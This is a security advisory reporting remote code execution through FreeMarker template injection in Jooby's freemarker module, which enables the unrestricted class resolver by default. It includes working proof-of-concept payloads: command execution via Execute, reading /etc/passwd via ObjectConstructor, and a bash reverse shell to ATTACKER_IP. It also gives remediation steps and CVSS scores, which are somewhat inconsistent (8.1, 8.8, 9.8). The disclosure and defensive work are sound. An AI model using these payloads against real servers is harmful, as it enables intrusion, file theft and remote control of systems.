# Jooby FreeMarker Module - Remote Code Execution via Unsafe Class Resolver Configuration

## Vulnerability Summary

The Jooby FreeMarker module (`jooby-freemarker`) uses an insecure default configuration by setting FreeMarker's `NewBuiltinClassResolver` to `UNRESTRICTED_RESOLVER`. This configuration allows FreeMarker templates to instantiate arbitrary Java classes via the `?new` built-in function, which can lead to Remote Code Execution (RCE) when an attacker can control template content or template model data.

**Vulnerability Type**: Remote Code Execution (RCE)
**CVSS Score**: 8.1 (High)
**CWE**: CWE-94 (Improper Control of Generation of Code)

## Credit

**Discoverer**: s1ain
**Discovery Date**: November 2025
**Vendor Notification**: TBD

## Product & Version

**Vendor**: Jooby Project
**Product**: Jooby Framework - FreeMarker Module
**Affected Versions**:
- 4.0.0 to 4.0.11-SNAPSHOT (current)
- Likely all 3.x versions
- Likely all 2.x versions

**Fixed Version**: None (not yet patched)

**Component**: `modules/jooby-freemarker/src/main/java/io/jooby/freemarker/FreemarkerModule.java`

## Vulnerability Details

### Root Cause

The vulnerability exists in the `FreemarkerModule` constructor at line 127:

```java
public FreemarkerModule() {
    // ...
    configuration.setNewBuiltinClassResolver(TemplateClassResolver.UNRESTRICTED_RESOLVER);
    // ...
}
```

This configuration setting allows templates to use the `?new` built-in to instantiate any Java class available on the classpath without restrictions.

### Attack Vectors

The vulnerability can be exploited in the following scenarios:

#### Vector 1: User-Controlled Template Content

If the application allows users to create or modify FreeMarker templates (e.g., custom email templates, dynamic page templates, template customization features):

```java
// Vulnerable application code
app.get("/render-custom", ctx -> {
    String userTemplate = ctx.query("template").value();
    return new ModelAndView("inline:" + userTemplate, model);
});
```

Attack payload:
```
GET /render-custom?template=<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```

#### Vector 2: User-Controlled Template Model Data

Even if template content is fixed, if an attacker can control data passed to the template as a Map with arbitrary keys and values:

```java
// Vulnerable application code
app.get("/profile", ctx -> {
    Map<String, Object> model = new HashMap<>();
    // User can control JSON data
    model.putAll(parseUserJson(ctx.body().value()));
    return new ModelAndView("profile.ftl", model);
});
```

Attack via template accessing malicious model data:
```ftl
<!-- profile.ftl -->
${userControlledKey}  <!-- If this resolves to a malicious object with ?new -->
```

#### Vector 3: Template Injection via Object Properties

If templates access properties of user-controlled objects that return specially crafted strings:

```java
public class UserProfile {
    public String getBio() {
        // Attacker-controlled bio field
        return "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}";
    }
}
```

### Impact

Successful exploitation allows an attacker to:

1. **Execute arbitrary system commands** via `freemarker.template.utility.Execute`
2. **Read arbitrary files** via `java.io.File` and related classes
3. **Make arbitrary network connections** via `java.net.URL` or `java.net.Socket`
4. **Access and manipulate Java objects** in the application's classpath
5. **Achieve full Remote Code Execution** on the server

### Technical Analysis

FreeMarker provides three levels of class resolution security:

1. **UNRESTRICTED_RESOLVER** (INSECURE - Jooby's default):
   - Allows instantiation of ANY class
   - No security restrictions
   - Suitable only for completely trusted templates

2. **SAFER_RESOLVER** (RECOMMENDED):
   - Allows only safe classes (primitives, common collections)
   - Blocks dangerous classes like `Execute`, `ObjectConstructor`, etc.
   - Default in FreeMarker 2.3.17+

3. **ALLOWS_NOTHING_RESOLVER** (MOST SECURE):
   - Completely disables `?new` built-in
   - Maximum security but may break legitimate use cases

The FreeMarker documentation explicitly warns against using `UNRESTRICTED_RESOLVER` except for fully trusted template content.

## Proof of Concept

### Setup

1. Create a Jooby application with FreemarkerModule:

```java
import io.jooby.Jooby;
import io.jooby.freemarker.FreemarkerModule;

public class VulnerableApp extends Jooby {
    {
        install(new FreemarkerModule());

        // Vulnerable endpoint - user controls template content
        get("/render", ctx -> {
            String template = ctx.query("tpl").value();
            return new ModelAndView("string:" + template,
                java.util.Map.of("greeting", "Hello"));
        });
    }

    public static void main(String[] args) {
        runApp(args, VulnerableApp::new);
    }
}
```

2. Add dependencies in `pom.xml`:

```xml
<dependency>
    <groupId>io.jooby</groupId>
    <artifactId>jooby-freemarker</artifactId>
    <version>4.0.11-SNAPSHOT</version>
</dependency>
```

### Exploitation

#### PoC 1: Command Execution via Execute Class

```bash
# Execute 'whoami' command
curl 'http://localhost:8080/render?tpl=%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew()%3E%24%7Bex(%22whoami%22)%7D'

# URL decoded payload:
# <#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}
```

**Expected Result**: The server executes `whoami` and returns the username in the response.

#### PoC 2: File Reading via ObjectConstructor

```bash
curl 'http://localhost:8080/render?tpl=%3C%23assign%20oc%3D%22freemarker.template.utility.ObjectConstructor%22%3Fnew()%3E%3C%23assign%20fr%3Doc(%22java.io.FileReader%22%2C%22%2Fetc%2Fpasswd%22)%3E%3C%23assign%20br%3Doc(%22java.io.BufferedReader%22%2Cfr)%3E%3C%23list%201..999%20as%20x%3E%24%7Bbr.readLine()!%7D%3Cbr%3E%3C%2F%23list%3E'

# URL decoded payload:
# <#assign oc="freemarker.template.utility.ObjectConstructor"?new()>
# <#assign fr=oc("java.io.FileReader","/etc/passwd")>
# <#assign br=oc("java.io.BufferedReader",fr)>
# <#list 1..999 as x>${br.readLine()!}<br></#list>
```

**Expected Result**: The server reads and returns the contents of `/etc/passwd`.

#### PoC 3: Reverse Shell (Linux)

```ftl
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'")}
```

**Expected Result**: Server initiates a reverse shell connection to the attacker's machine.

### Verification Steps

1. Start the vulnerable application:
   ```bash
   mvn jooby:run
   ```

2. Send the PoC request:
   ```bash
   curl 'http://localhost:8080/render?tpl=%3C%23assign%20ex%3D%22freemarker.template.utility.Execute%22%3Fnew()%3E%24%7Bex(%22id%22)%7D'
   ```

3. Observe the command output in the HTTP response

4. Check server logs for evidence of execution

### Attack Complexity

- **Attack Vector**: Network (CVSS:3.1/AV:N)
- **Attack Complexity**: Low (CVSS:3.1/AC:L)
- **Privileges Required**: Low/None (depends on whether endpoint requires authentication)
- **User Interaction**: None (CVSS:3.1/UI:N)
- **Scope**: Unchanged (CVSS:3.1/S:U)
- **Confidentiality Impact**: High (CVSS:3.1/C:H)
- **Integrity Impact**: High (CVSS:3.1/I:H)
- **Availability Impact**: High (CVSS:3.1/A:H)

**CVSS:3.1 Vector String**: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`
**Base Score**: 8.8 (High) - for authenticated endpoints
**Base Score**: 9.8 (Critical) - for unauthenticated endpoints

## Remediation

### Immediate Fix (Recommended)

Change the class resolver configuration in `FreemarkerModule.java`:

```java
// BEFORE (VULNERABLE):
configuration.setNewBuiltinClassResolver(TemplateClassResolver.UNRESTRICTED_RESOLVER);

// AFTER (SECURE):
configuration.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
```

### Alternative Fix (Maximum Security)

Completely disable the `?new` built-in:

```java
configuration.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
```

### Configuration Option (Backward Compatibility)

Allow users to configure the resolver:

```java
public class FreemarkerModule implements Extension {
    private TemplateClassResolver newBuiltinClassResolver = TemplateClassResolver.SAFER_RESOLVER;

    public FreemarkerModule withClassResolver(TemplateClassResolver resolver) {
        this.newBuiltinClassResolver = resolver;
        return this;
    }

    @Override
    public void install(@NonNull Jooby application) {
        // ...
        configuration.setNewBuiltinClassResolver(newBuiltinClassResolver);
        // ...
    }
}
```

### Migration Impact

Changing to `SAFER_RESOLVER` may break applications that:
- Legitimately use `?new` to instantiate custom classes
- Rely on the `Execute` utility (should use Java code instead)
- Use `ObjectConstructor` for dynamic object creation

**Mitigation for legitimate use cases**:
- Move class instantiation logic to Java code
- Pass pre-constructed objects to templates
- Use FreeMarker's built-in functions instead of `?new`

## Additional Security Recommendations

1. **Input Validation**: Never allow users to control template content
2. **Template Sandboxing**: Store templates in trusted locations only
3. **API Security**: Disable `setAPIBuiltinEnabled()` if not needed
4. **Field Exposure**: Set `setExposeFields(false)` (currently `true` in Jooby)
5. **Regular Updates**: Monitor FreeMarker security advisories

## References

1. **FreeMarker Documentation - Security**:
   - https://freemarker.apache.org/docs/app_faq.html#faq_template_uploading_security
   - https://freemarker.apache.org/docs/api/freemarker/core/TemplateClassResolver.html

2. **Similar Vulnerabilities**:
   - CVE-2020-25631 - FreeMarker Template Injection in other frameworks
   - https://portswigger.net/research/server-side-template-injection

3. **Jooby Framework**:
   - https://jooby.io
   - https://github.com/jooby-project/jooby

4. **CWE References**:
   - CWE-94: Improper Control of Generation of Code ('Code Injection')
   - CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code

## Timeline

- **2025-11-02**: Vulnerability discovered during security audit of Jooby framework
- **2025-11-02**: Initial analysis and PoC development completed
- **TBD**: Vendor notification
- **TBD**: Vendor response
- **TBD**: Patch development
- **TBD**: Public disclosure

## Affected Deployments

This vulnerability affects:

1. **All applications using `jooby-freemarker` module** with default configuration
2. **High-risk scenarios**:
   - Template customization features
   - User-generated content in templates
   - Dynamic template selection based on user input
   - Multi-tenant systems with custom templates
3. **Medium-risk scenarios**:
   - Applications passing user data to template models
   - Systems with complex object graphs in templates

## Severity Assessment

| Factor | Rating | Justification |
|--------|--------|---------------|
| Exploitability | High | Simple payload, no special tools required |
| Impact | Critical | Full RCE, server compromise possible |
| Affected Users | Medium | Only apps using jooby-freemarker module |
| Detection Difficulty | Easy | Configuration issue visible in code |
| Fix Complexity | Low | One-line configuration change |

**Overall Severity**: **HIGH (8.8)** for authenticated scenarios, **CRITICAL (9.8)** for unauthenticated scenarios

## Conclusion

The Jooby FreeMarker module's use of `UNRESTRICTED_RESOLVER` represents a significant security risk that could lead to complete server compromise in applications where attackers can influence template content or model data. The fix is straightforward and should be implemented immediately. All users of the `jooby-freemarker` module should review their code for vulnerable patterns and apply the recommended configuration change.
